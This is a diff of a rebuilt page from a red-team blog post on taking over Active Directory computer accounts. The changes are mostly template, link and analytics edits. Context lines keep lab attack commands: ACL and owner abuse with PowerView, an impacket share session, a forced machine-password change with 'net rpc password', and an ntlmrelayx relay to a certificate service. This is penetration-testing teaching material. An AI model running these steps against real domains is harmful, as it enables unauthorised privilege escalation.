@@ -1,50 +1,47 @@
 <!DOCTYPE html>
 <html lang="en-us">
 <head>
-	
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-B7WYBWVRDC"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'G-B7WYBWVRDC');
-</script>
   <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
   <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
   <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
   <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
   <script type="text/javascript" src="https://latest.cactus.chat/cactus.js"></script>
   <link rel="stylesheet" href="https://latest.cactus.chat/style.css" type="text/css">
+  
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <title> How to : take over ComputerObject | </title>
-  <link rel = 'canonical' href = '/posts/computerobject/'>
+  <title> How to : take over ComputerObject | Ottersec Blog</title>
+  <link rel = 'canonical' href = 'https://sneakyottersec.github.io/posts/computerobject/'>
   <meta name="description" content="Red Teamer / Pentester. Focus on Active Directory / Azure / Windows logical bug">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta name="robots" content="all,follow">
   <meta name="googlebot" content="index,follow,snippet,archive">
-  <meta property="og:title" content="How to : take over ComputerObject" />
-<meta property="og:description" content="1. Active Directory Computer Object : A brief overview The computer account is a Security Principal which is a key part of the Active Directory Services. Each computer or server which is joined to the domain has his own computer account, which is essential for many tasks such as :
- Establish a secure channel for the user authentication Deploy a GPO tied to a computer and not a user Identify the computer as a workstation, server or domain controller Used to access network resources as a low-privileged account Unrestricted access to the resources on the local machine &hellip;  One thing to keep in mind : the password management of the computer account is delegated to the Active Directory which renders password spraying or Kerberoasting useless in most cases." />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="/posts/computerobject/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2022-05-18T18:39:47+02:00" />
-<meta property="article:modified_time" content="2022-05-18T18:39:47+02:00" /><meta property="og:site_name" content="Ottersec Blog" />
-
-
-  <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="How to : take over ComputerObject"/>
-<meta name="twitter:description" content="1. Active Directory Computer Object : A brief overview The computer account is a Security Principal which is a key part of the Active Directory Services. Each computer or server which is joined to the domain has his own computer account, which is essential for many tasks such as :
- Establish a secure channel for the user authentication Deploy a GPO tied to a computer and not a user Identify the computer as a workstation, server or domain controller Used to access network resources as a low-privileged account Unrestricted access to the resources on the local machine &hellip;  One thing to keep in mind : the password management of the computer account is delegated to the Active Directory which renders password spraying or Kerberoasting useless in most cases."/>
+  <meta property="og:url" content="https://sneakyottersec.github.io/posts/computerobject/">
+  <meta property="og:site_name" content="Ottersec Blog">
+  <meta property="og:title" content="How to : take over ComputerObject">
+  <meta property="og:description" content="1. Active Directory Computer Object : A brief overview The computer account is a Security Principal which is a key part of the Active Directory Services. Each computer or server which is joined to the domain has his own computer account, which is essential for many tasks such as :
+Establish a secure channel for the user authentication Deploy a GPO tied to a computer and not a user Identify the computer as a workstation, server or domain controller Used to access network resources as a low-privileged account Unrestricted access to the resources on the local machine … One thing to keep in mind : the password management of the computer account is delegated to the Active Directory which renders password spraying or Kerberoasting useless in most cases.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2022-05-18T18:39:47+02:00">
+    <meta property="article:modified_time" content="2022-05-18T18:39:47+02:00">
+    <meta property="article:tag" content="Active Directory">
+    <meta property="article:tag" content="Computer Account">
 
   
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="How to : take over ComputerObject">
+  <meta name="twitter:description" content="1. Active Directory Computer Object : A brief overview The computer account is a Security Principal which is a key part of the Active Directory Services. Each computer or server which is joined to the domain has his own computer account, which is essential for many tasks such as :
+Establish a secure channel for the user authentication Deploy a GPO tied to a computer and not a user Identify the computer as a workstation, server or domain controller Used to access network resources as a low-privileged account Unrestricted access to the resources on the local machine … One thing to keep in mind : the password management of the computer account is delegated to the Active Directory which renders password spraying or Kerberoasting useless in most cases.">
+
   
   
     
   
   
-  <link rel="stylesheet" href="/css/styles.4c2b9aa1d874d6766f554b2d404e8fd62ab4761f51ee9b3f358d12e81e7fa43a1b4378db995bc1926bbe5ed98c060be5e7bd4f2470504cf94f22b4b3a74e62b6.css" integrity="sha512-TCuaodh01nZvVUstQE6P1iq0dh9R7ps/NY0S6B5/pDobQ3jbmVvBkmu&#43;XtmMBgvl571PJHBQTPlPIrSzp05itg=="> 
+  <link rel="stylesheet" href="https://sneakyottersec.github.io/css/styles.4c2b9aa1d874d6766f554b2d404e8fd62ab4761f51ee9b3f358d12e81e7fa43a1b4378db995bc1926bbe5ed98c060be5e7bd4f2470504cf94f22b4b3a74e62b6.css" integrity="sha512-TCuaodh01nZvVUstQE6P1iq0dh9R7ps/NY0S6B5/pDobQ3jbmVvBkmu&#43;XtmMBgvl571PJHBQTPlPIrSzp05itg==">
 
   
   
@@ -56,11 +53,27 @@
   
 
   
-<link rel="icon" type="image/png" href="images/favicon.ico" />
+<link rel="icon" type="image/png" href="https://sneakyottersec.github.io/images/favicon.ico" />
 
   
   
   
+  
+    
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-B7WYBWVRDC"></script>
+      <script>
+        var doNotTrack = false;
+        if ( true ) {
+          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
+          var doNotTrack = (dnt == "1" || dnt == "yes");
+        }
+        if (!doNotTrack) {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-B7WYBWVRDC');
+        }
+      </script>
   
 </head>
 
@@ -75,9 +88,9 @@
     <span id="nav">
       <ul>
          
-        <li><a href="/posts">All posts</a></li>
-         
         <li><a href="/">Home</a></li>
+         
+        <li><a href="/posts">All posts</a></li>
         
       </ul>
     </span>
@@ -86,14 +99,14 @@
       <ul>
         
         <li>
-          <a class="icon" href=" /posts/autodiscover101/" aria-label="Previous">
+          <a class="icon" href=" https://sneakyottersec.github.io/posts/autodiscover101/" aria-label="Previous">
             <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
           </a>
         </li>
         
         
         <li>
-          <a class="icon" href="/posts/azuretoken/" aria-label="Next">
+          <a class="icon" href="https://sneakyottersec.github.io/posts/azuretoken/" aria-label="Next">
             <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
           </a>
         </li>
@@ -124,47 +137,47 @@
   
   
   <li>
-    <a class="icon" href="http://www.facebook.com/sharer.php?u=%2fposts%2fcomputerobject%2f" aria-label="Facebook">
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fsneakyottersec.github.io%2fposts%2fcomputerobject%2f" aria-label="Facebook">
       <i class="fab fa-facebook " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://twitter.com/share?url=%2fposts%2fcomputerobject%2f&text=How%20to%20%3a%20take%20over%20ComputerObject" aria-label="Twitter">
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fsneakyottersec.github.io%2fposts%2fcomputerobject%2f&text=How%20to%20%3a%20take%20over%20ComputerObject" aria-label="Twitter">
       <i class="fab fa-twitter " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="http://www.linkedin.com/shareArticle?url=%2fposts%2fcomputerobject%2f&title=How%20to%20%3a%20take%20over%20ComputerObject" aria-label="Linkedin">
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fsneakyottersec.github.io%2fposts%2fcomputerobject%2f&title=How%20to%20%3a%20take%20over%20ComputerObject" aria-label="Linkedin">
       <i class="fab fa-linkedin " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=%2fposts%2fcomputerobject%2f&is_video=false&description=How%20to%20%3a%20take%20over%20ComputerObject" aria-label="Pinterest">
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fsneakyottersec.github.io%2fposts%2fcomputerobject%2f&is_video=false&description=How%20to%20%3a%20take%20over%20ComputerObject" aria-label="Pinterest">
       <i class="fab fa-pinterest " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="mailto:?subject=How%20to%20%3a%20take%20over%20ComputerObject&body=Check out this article: %2fposts%2fcomputerobject%2f" aria-label="Email">
+    <a class="icon" href="mailto:?subject=How%20to%20%3a%20take%20over%20ComputerObject&body=Check out this article: https%3a%2f%2fsneakyottersec.github.io%2fposts%2fcomputerobject%2f" aria-label="Email">
       <i class="fas fa-envelope " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://getpocket.com/save?url=%2fposts%2fcomputerobject%2f&title=How%20to%20%3a%20take%20over%20ComputerObject" aria-label="Pocket">
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fsneakyottersec.github.io%2fposts%2fcomputerobject%2f&title=How%20to%20%3a%20take%20over%20ComputerObject" aria-label="Pocket">
       <i class="fab fa-get-pocket " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="http://reddit.com/submit?url=%2fposts%2fcomputerobject%2f&title=How%20to%20%3a%20take%20over%20ComputerObject" aria-label="reddit">
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fsneakyottersec.github.io%2fposts%2fcomputerobject%2f&title=How%20to%20%3a%20take%20over%20ComputerObject" aria-label="reddit">
       <i class="fab fa-reddit " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="http://www.tumblr.com/share/link?url=%2fposts%2fcomputerobject%2f&name=How%20to%20%3a%20take%20over%20ComputerObject&description=1.%20Active%20Directory%20Computer%20Object%20%3a%20A%20brief%20overview%20The%20computer%20account%20is%20a%20Security%20Principal%20which%20is%20a%20key%20part%20of%20the%20Active%20Directory%20Services.%20Each%20computer%20or%20server%20which%20is%20joined%20to%20the%20domain%20has%20his%20own%20computer%20account%2c%20which%20is%20essential%20for%20many%20tasks%20such%20as%20%3a%0a%20Establish%20a%20secure%20channel%20for%20the%20user%20authentication%20Deploy%20a%20GPO%20tied%20to%20a%20computer%20and%20not%20a%20user%20Identify%20the%20computer%20as%20a%20workstation%2c%20server%20or%20domain%20controller%20Used%20to%20access%20network%20resources%20as%20a%20low-privileged%20account%20Unrestricted%20access%20to%20the%20resources%20on%20the%20local%20machine%20%26hellip%3b%20%20One%20thing%20to%20keep%20in%20mind%20%3a%20the%20password%20management%20of%20the%20computer%20account%20is%20delegated%20to%20the%20Active%20Directory%20which%20renders%20password%20spraying%20or%20Kerberoasting%20useless%20in%20most%20cases." aria-label="Tumblr">
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fsneakyottersec.github.io%2fposts%2fcomputerobject%2f&name=How%20to%20%3a%20take%20over%20ComputerObject&description=%3ch1%20id%3d%221-active-directory-computer-object--a-brief-overview%22%3e1.%20Active%20Directory%20Computer%20Object%20%3a%20A%20brief%20overview%3c%2fh1%3e%0a%3cp%3eThe%20%3cstrong%3ecomputer%20account%3c%2fstrong%3e%20is%20a%20%3cstrong%3eSecurity%20Principal%3c%2fstrong%3e%20which%20is%20a%20key%20part%20of%20the%20Active%20Directory%20Services.%20Each%20computer%20or%20server%20which%20is%20joined%20to%20the%20domain%20has%20his%20%3cstrong%3eown%20computer%20account%3c%2fstrong%3e%2c%20which%20is%20essential%20for%20many%20tasks%20such%20as%20%3a%3c%2fp%3e%0a%3cul%3e%0a%3cli%3eEstablish%20a%20secure%20channel%20for%20the%20user%20authentication%3c%2fli%3e%0a%3cli%3eDeploy%20a%20GPO%20tied%20to%20a%20computer%20and%20not%20a%20user%3c%2fli%3e%0a%3cli%3eIdentify%20the%20computer%20as%20a%20workstation%2c%20server%20or%20domain%20controller%3c%2fli%3e%0a%3cli%3eUsed%20to%20access%20network%20resources%20as%20a%20low-privileged%20account%3c%2fli%3e%0a%3cli%3eUnrestricted%20access%20to%20the%20resources%20on%20the%20local%20machine%0a%26hellip%3b%3c%2fli%3e%0a%3c%2ful%3e%0a%3cp%3eOne%20thing%20to%20keep%20in%20mind%20%3a%20the%20password%20management%20of%20the%20computer%20account%20is%20%3cstrong%3edelegated%20to%20the%20Active%20Directory%3c%2fstrong%3e%20which%20renders%20password%20spraying%20or%20Kerberoasting%20useless%20in%20most%20cases.%3c%2fp%3e" aria-label="Tumblr">
       <i class="fab fa-tumblr " aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://news.ycombinator.com/submitlink?u=%2fposts%2fcomputerobject%2f&t=How%20to%20%3a%20take%20over%20ComputerObject" aria-label="Hacker News">
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fsneakyottersec.github.io%2fposts%2fcomputerobject%2f&t=How%20to%20%3a%20take%20over%20ComputerObject" aria-label="Hacker News">
       <i class="fab fa-hacker-news " aria-hidden="true"></i>
     </a>
   </li>
@@ -204,6 +217,12 @@
           
         </div>
         
+        
+        <div class="article-read-time">
+          <i class="far fa-clock"></i>
+          
+          14 minute read
+        </div>
         
         
         
@@ -328,7 +347,7 @@ ms-Mcs-AdmPwd: THD3mAn.+Y5E9Y
 Set-DomainObjectOwner -OwnerIdentity ownerwks1 -Identity wks1
 </code></pre><p><img src="/img/owner.png" alt="LookupSID"></p>
 <pre tabindex="0"><code># Modify the DACL of WKS1 in order to grant ourself the FullControl over the object
-Add-DomainObjectAcl -Rights All -TargetIdentity wks1 -PrincipalIdentity ownerwks1 -Verbose       
+Add-DomainObjectAcl -Rights All -TargetIdentity wks1 -PrincipalIdentity ownerwks1 -Verbose
 VERBOSE: [Get-DomainSearcher] search base: LDAP://DC1.TEST.LOCAL/DC=TEST,DC=LOCAL
 VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
 (&amp;(|(|(samAccountName=ownerwks1)(name=ownerwks1)(displayname=ownerwks1))))
@@ -374,7 +393,7 @@ Impacket v0.9.24.dev1+20211022.182843.4229481c - Copyright 2021 SecureAuth Corpo
 
 Type help for list of commands
 # use C$
-# ls 
+# ls
 drw-rw-rw-          0  Mon May 16 10:07:31 2022 $Recycle.Bin
 drw-rw-rw-          0  Mon May 16 10:37:18 2022 $WINDOWS.~BT
 drw-rw-rw-          0  Sat May 14 00:29:10 2022 $WinREAgent
@@ -393,7 +412,7 @@ drw-rw-rw-          0  Mon May 16 10:37:22 2022 Windows
 <p><em>Note2 : [-] Kerberos SessionError: KDC_ERR_PREAUTH_FAILED : If you&rsquo;re 100% sure about your NT hash, double check that you&rsquo;re using the FQDN and not the IP for the target</em></p>
 <h2 id="24-force-change-computer-account-password">2.4 Force Change computer account password</h2>
 <hr>
-<p><strong>Prerequisite Edge</strong> : <em>ForceChangePassword, GenericAll<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></em></p>
+<p><strong>Prerequisite Edge</strong> : <em>ForceChangePassword, GenericAll<sup id="fnref1:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></em></p>
 <p><strong>Tools</strong>           : <em>rpcclient,net</em></p>
 <hr>
 <p>There may be some &ldquo;extreme&rdquo; use case when your only option left will be to change the password of the targeted computer account. More precisely when :</p>
@@ -408,7 +427,7 @@ set the password are well explained in <a href="https://docs.microsoft.com/en-us
 <pre tabindex="0"><code># 1. Net tool from samba
 net rpc password VulnerablePASSW\$ -U &#34;TEST.LOCAL\User&#34; -S 192.168.1.43
 Enter new password for VulnerablePASSW$:
-Enter TEST.LOCAL\User&#39;s password: 
+Enter TEST.LOCAL\User&#39;s password:
 </code></pre><h2 id="25-password-spraying">2.5 Password spraying</h2>
 <hr>
 <p><strong>Prerequisite</strong> : <em>None</em></p>
@@ -482,7 +501,7 @@ sudo python3 ntlmrelayx.py -t http://192.168.1.29/certsrv/certfnsh.asp -smb2supp
 <h2 id="27-resource-based-constrained-delegation">2.7 Resource Based Constrained Delegation</h2>
 <hr>
 <p><strong>Prerequisite</strong> : <em>One machine account AND
-GenericAll,AlowedToAct,WriteAllowedToAct<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></em></p>
+GenericAll,AlowedToAct,WriteAllowedToAct<sup id="fnref2:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></em></p>
 <p><strong>Tools</strong>         : <em>RSAT,PowerMad,Standin,Impacket,..</em></p>
 <hr>
 <p>Most of the time when you&rsquo;ll encounter a <em>RBCD</em> path in the wild it will be exploitable through the <strong>GeneriAll/GenericWrite</strong> or <strong>AllowedToAct</strong> privilege to a computer object. We won&rsquo;t go to deep in the details here,but please note that this attack does require that you own
@@ -522,7 +541,7 @@ export KRB5CCNAME=Administrator.ccache
 <p><em>Update 16/05 : Tiraniddo posted a <a href="https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html">fantastic blog post</a> to perform an RBCD attack using a user account instead of a computer account.</em></p>
 <h2 id="28-contrained-delegation">2.8 Contrained delegation</h2>
 <hr>
-<p><strong>Prerequisites</strong> : <em>Populated msDS-AllowedToDeletaTo OR right to write this LDAP attribute <sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></em></p>
+<p><strong>Prerequisites</strong> : <em>Populated msDS-AllowedToDeletaTo OR right to write this LDAP attribute <sup id="fnref3:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></em></p>
 <p><strong>Tools</strong>         : <em>Rubeus,Impacket,Kekeo, ..</em></p>
 <hr>
 <p>Our last case will be the <strong>Constrained Delegation</strong>. When you are in control of a computer account to which some constrained delegation has been performed, you will be able to exploit it and take control of the target.</p>
@@ -578,17 +597,17 @@ drw-rw-rw-          0  Wed May 18 12:00:52 2022 Windows
 <a href="https://securityboulevard.com/2022/02/spn-jacking-an-edge-case-in-writespn-abuse/">https://securityboulevard.com/2022/02/spn-jacking-an-edge-case-in-writespn-abuse/</a>
 <a href="https://www.secureauth.com/blog/kerberos-delegation-spns-and-more/">https://www.secureauth.com/blog/kerberos-delegation-spns-and-more/</a>
 <a href="https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/service-accounts-computer">https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/service-accounts-computer</a></p>
-<section class="footnotes" role="doc-endnotes">
+<div class="footnotes" role="doc-endnotes">
 <hr>
 <ol>
-<li id="fn:1" role="doc-endnote">
-<p>We will skip the edge that allows you to do it indirectly : Owner,WriteOwner,WriteDACL&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+<li id="fn:1">
+<p>We will skip the edge that allows you to do it indirectly : Owner,WriteOwner,WriteDACL&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a>&#160;<a href="#fnref1:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a>&#160;<a href="#fnref2:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a>&#160;<a href="#fnref3:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
 </li>
-<li id="fn:2" role="doc-endnote">
+<li id="fn:2">
 <p>My go-to will be to use the <a href="https://github.com/leechristensen/Random/blob/master/PowerShellScripts/Get-LdapCurrentUser.ps1">this</a> powershell script to first check that our generated certificate is indeed working.&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
 </li>
 </ol>
-</section>
+</div>
 
     </div>
   </article>
@@ -599,6 +618,23 @@ drw-rw-rw-          0  Wed May 18 12:00:52 2022 Windows
 
 
 
+  <div class="blog-post-comments">
+    
+      <div id="cactus-comments-thread">
+  <script>
+  initComments({
+    node: document.getElementById("cactus-comments-thread"),
+    defaultHomeserverUrl: 'https:\/\/matrix.cactus.chat:8448',
+    serverName: 'cactus.chat',
+    siteName: "sneakyottersec",
+    commentSectionId: "\/posts\/computerobject\/"
+  })
+</script>
+</div>
+
+    
+  </div>
+
 
 
   <div id="footer-post-container">
@@ -607,9 +643,9 @@ drw-rw-rw-          0  Wed May 18 12:00:52 2022 Windows
     <div id="nav-footer" style="display: none">
       <ul>
          
-          <li><a href="/posts">All posts</a></li>
-         
           <li><a href="/">Home</a></li>
+         
+          <li><a href="/posts">All posts</a></li>
         
       </ul>
     </div>
@@ -640,47 +676,47 @@ drw-rw-rw-          0  Wed May 18 12:00:52 2022 Windows
   
   
   <li>
-    <a class="icon" href="http://www.facebook.com/sharer.php?u=%2fposts%2fcomputerobject%2f" aria-label="Facebook">
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fsneakyottersec.github.io%2fposts%2fcomputerobject%2f" aria-label="Facebook">
       <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://twitter.com/share?url=%2fposts%2fcomputerobject%2f&text=How%20to%20%3a%20take%20over%20ComputerObject" aria-label="Twitter">
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fsneakyottersec.github.io%2fposts%2fcomputerobject%2f&text=How%20to%20%3a%20take%20over%20ComputerObject" aria-label="Twitter">
       <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="http://www.linkedin.com/shareArticle?url=%2fposts%2fcomputerobject%2f&title=How%20to%20%3a%20take%20over%20ComputerObject" aria-label="Linkedin">
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fsneakyottersec.github.io%2fposts%2fcomputerobject%2f&title=How%20to%20%3a%20take%20over%20ComputerObject" aria-label="Linkedin">
       <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=%2fposts%2fcomputerobject%2f&is_video=false&description=How%20to%20%3a%20take%20over%20ComputerObject" aria-label="Pinterest">
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fsneakyottersec.github.io%2fposts%2fcomputerobject%2f&is_video=false&description=How%20to%20%3a%20take%20over%20ComputerObject" aria-label="Pinterest">
       <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="mailto:?subject=How%20to%20%3a%20take%20over%20ComputerObject&body=Check out this article: %2fposts%2fcomputerobject%2f" aria-label="Email">
+    <a class="icon" href="mailto:?subject=How%20to%20%3a%20take%20over%20ComputerObject&body=Check out this article: https%3a%2f%2fsneakyottersec.github.io%2fposts%2fcomputerobject%2f" aria-label="Email">
       <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://getpocket.com/save?url=%2fposts%2fcomputerobject%2f&title=How%20to%20%3a%20take%20over%20ComputerObject" aria-label="Pocket">
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fsneakyottersec.github.io%2fposts%2fcomputerobject%2f&title=How%20to%20%3a%20take%20over%20ComputerObject" aria-label="Pocket">
       <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="http://reddit.com/submit?url=%2fposts%2fcomputerobject%2f&title=How%20to%20%3a%20take%20over%20ComputerObject" aria-label="reddit">
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fsneakyottersec.github.io%2fposts%2fcomputerobject%2f&title=How%20to%20%3a%20take%20over%20ComputerObject" aria-label="reddit">
       <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="http://www.tumblr.com/share/link?url=%2fposts%2fcomputerobject%2f&name=How%20to%20%3a%20take%20over%20ComputerObject&description=1.%20Active%20Directory%20Computer%20Object%20%3a%20A%20brief%20overview%20The%20computer%20account%20is%20a%20Security%20Principal%20which%20is%20a%20key%20part%20of%20the%20Active%20Directory%20Services.%20Each%20computer%20or%20server%20which%20is%20joined%20to%20the%20domain%20has%20his%20own%20computer%20account%2c%20which%20is%20essential%20for%20many%20tasks%20such%20as%20%3a%0a%20Establish%20a%20secure%20channel%20for%20the%20user%20authentication%20Deploy%20a%20GPO%20tied%20to%20a%20computer%20and%20not%20a%20user%20Identify%20the%20computer%20as%20a%20workstation%2c%20server%20or%20domain%20controller%20Used%20to%20access%20network%20resources%20as%20a%20low-privileged%20account%20Unrestricted%20access%20to%20the%20resources%20on%20the%20local%20machine%20%26hellip%3b%20%20One%20thing%20to%20keep%20in%20mind%20%3a%20the%20password%20management%20of%20the%20computer%20account%20is%20delegated%20to%20the%20Active%20Directory%20which%20renders%20password%20spraying%20or%20Kerberoasting%20useless%20in%20most%20cases." aria-label="Tumblr">
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fsneakyottersec.github.io%2fposts%2fcomputerobject%2f&name=How%20to%20%3a%20take%20over%20ComputerObject&description=%3ch1%20id%3d%221-active-directory-computer-object--a-brief-overview%22%3e1.%20Active%20Directory%20Computer%20Object%20%3a%20A%20brief%20overview%3c%2fh1%3e%0a%3cp%3eThe%20%3cstrong%3ecomputer%20account%3c%2fstrong%3e%20is%20a%20%3cstrong%3eSecurity%20Principal%3c%2fstrong%3e%20which%20is%20a%20key%20part%20of%20the%20Active%20Directory%20Services.%20Each%20computer%20or%20server%20which%20is%20joined%20to%20the%20domain%20has%20his%20%3cstrong%3eown%20computer%20account%3c%2fstrong%3e%2c%20which%20is%20essential%20for%20many%20tasks%20such%20as%20%3a%3c%2fp%3e%0a%3cul%3e%0a%3cli%3eEstablish%20a%20secure%20channel%20for%20the%20user%20authentication%3c%2fli%3e%0a%3cli%3eDeploy%20a%20GPO%20tied%20to%20a%20computer%20and%20not%20a%20user%3c%2fli%3e%0a%3cli%3eIdentify%20the%20computer%20as%20a%20workstation%2c%20server%20or%20domain%20controller%3c%2fli%3e%0a%3cli%3eUsed%20to%20access%20network%20resources%20as%20a%20low-privileged%20account%3c%2fli%3e%0a%3cli%3eUnrestricted%20access%20to%20the%20resources%20on%20the%20local%20machine%0a%26hellip%3b%3c%2fli%3e%0a%3c%2ful%3e%0a%3cp%3eOne%20thing%20to%20keep%20in%20mind%20%3a%20the%20password%20management%20of%20the%20computer%20account%20is%20%3cstrong%3edelegated%20to%20the%20Active%20Directory%3c%2fstrong%3e%20which%20renders%20password%20spraying%20or%20Kerberoasting%20useless%20in%20most%20cases.%3c%2fp%3e" aria-label="Tumblr">
       <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://news.ycombinator.com/submitlink?u=%2fposts%2fcomputerobject%2f&t=How%20to%20%3a%20take%20over%20ComputerObject" aria-label="Hacker News">
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fsneakyottersec.github.io%2fposts%2fcomputerobject%2f&t=How%20to%20%3a%20take%20over%20ComputerObject" aria-label="Hacker News">
       <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
     </a>
   </li>
@@ -708,15 +744,15 @@ drw-rw-rw-          0  Wed May 18 12:00:52 2022 Windows
 
   <footer id="footer">
   <div class="footer-left">
-    Copyright  &copy; 2022   
+    Copyright  &copy; 2026  Copyright © 2022 
   </div>
   <div class="footer-right">
     <nav>
       <ul>
          
-        <li><a href="/posts">All posts</a></li>
-         
         <li><a href="/">Home</a></li>
+         
+        <li><a href="/posts">All posts</a></li>
         
       </ul>
     </nav>
